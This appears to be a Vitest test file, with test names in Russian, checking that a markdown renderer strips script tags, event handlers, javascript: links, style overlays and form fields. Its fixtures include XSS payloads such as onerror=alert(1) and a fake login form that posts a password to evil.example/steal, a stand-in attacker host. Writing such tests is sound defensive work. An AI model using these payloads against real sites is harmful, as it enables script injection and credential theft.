// @vitest-environment jsdom
import { marked } from 'marked';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { renderMarkdown } from './render';

describe('renderMarkdown', () => {
  afterEach(() => vi.restoreAllMocks());

  it('не пропускает сырой script и обработчики событий', () => {
    const html = renderMarkdown('<script>alert(1)</script>\n\nтекст');
    expect(html).not.toContain('<script');
    expect(html).toContain('<p>текст</p>');

    const evil = renderMarkdown('<img src="x" onerror="alert(1)">\n\n[ссылка](javascript:alert(1))');
    expect(evil).not.toContain('onerror');
    expect(evil).not.toContain('javascript:');
  });

  describe('текст книги не должен захватывать приложение', () => {
    it('<style> вырезается вместе с содержимым', () => {
      const html = renderMarkdown('<style>body { display: none }</style>\n\nтекст');
      expect(html).not.toContain('<style');
      expect(html).not.toContain('display');
      expect(html).toContain('текст');
    });

    it('форма с полем пароля и кнопкой не переживает', () => {
      const html = renderMarkdown(
        '<form action="https://evil.example/steal"><input type="password" name="p"><button>Войти</button></form>\n\nтекст',
      );
      expect(html).not.toContain('<form');
      expect(html).not.toContain('<input');
      expect(html).not.toContain('password');
      expect(html).not.toContain('<button');
      expect(html).not.toContain('evil.example');
      expect(html).toContain('текст');
    });

    it('поля select, textarea, iframe, object, embed вырезаются', () => {
      for (const tag of ['select', 'textarea', 'iframe', 'object', 'embed']) {
        const html = renderMarkdown(`<${tag}></${tag}>\n\nтекст`);
        expect(html, tag).not.toContain(`<${tag}`);
      }
    });

    it('атрибут style снимается, содержимое остаётся', () => {
      const html = renderMarkdown('<div style="position:fixed;inset:0;z-index:99">закрыл экран</div>');
      expect(html).not.toContain('style');
      expect(html).not.toContain('position');
      expect(html).toContain('закрыл экран');
    });

    it('<input> любого типа, кроме checkbox, не остаётся (image, text, password)', () => {
      for (const type of ['image', 'text', 'password', 'file', 'submit']) {
        const html = renderMarkdown(`<input type="${type}" src="x">\n\nтекст`);
        expect(html, type).not.toContain('<input');
      }
    });

    it('обычный GFM-чекбокс задачи не пострадал', () => {
      const html = renderMarkdown('- [ ] шаг\n- [x] готово');
      expect(html.match(/<input[^>]*type="checkbox"/g)).toHaveLength(2);
      expect(html).toMatch(/<input[^>]*checked/);
      expect(html).toMatch(/<input[^>]*disabled/);
    });

    it('картинки остаются, обработчики событий на них — нет', () => {
      const html = renderMarkdown('![схема](https://example.com/a.png)\n\n<img src="x" onerror="alert(1)">');
      expect(html).toContain('<img src="https://example.com/a.png"');
      expect(html).not.toContain('onerror');
    });
  });

  it('если разбор упал, пишет в console.error и показывает текст как простые абзацы', () => {
    vi.spyOn(marked, 'parse').mockImplementation(() => {
      throw new Error('boom');
    });
    const err = vi.spyOn(console, 'error').mockImplementation(() => {});
    const html = renderMarkdown('первый <b>абзац</b>\n\nвторой');
    expect(err).toHaveBeenCalledTimes(1);
    expect(html).toBe('<p>первый &lt;b&gt;абзац&lt;/b&gt;</p><p>второй</p>');
  });

  it('GFM: таблица, зачёркивание, чекбоксы остаются', () => {
    const html = renderMarkdown('| а | б |\n|---|---|\n| 1 | 2 |\n\n~~старое~~\n\n- [ ] шаг\n- [x] готово');
    expect(html).toContain('<table>');
    expect(html).toContain('<del>старое</del>');
    expect(html.match(/<input[^>]*type="checkbox"/g)).toHaveLength(2);
    expect(html).toMatch(/<input[^>]*checked/);
  });

  it('breaks: false — одиночный перенос строки не превращается в <br>', () => {
    expect(renderMarkdown('раз\nдва')).not.toContain('<br');
  });

  it('start у нумерованного списка сохраняется', () => {
    expect(renderMarkdown('3. три\n4. четыре')).toContain('start="3"');
  });

  it('блок cards — это <pre><code class="language-cards">', () => {
    expect(renderMarkdown('```cards\nQ: а\nA: б\n```')).toContain('<code class="language-cards">');
  });

  it('пустая строка даёт пустую строку', () => {
    expect(renderMarkdown('')).toBe('');
  });
});
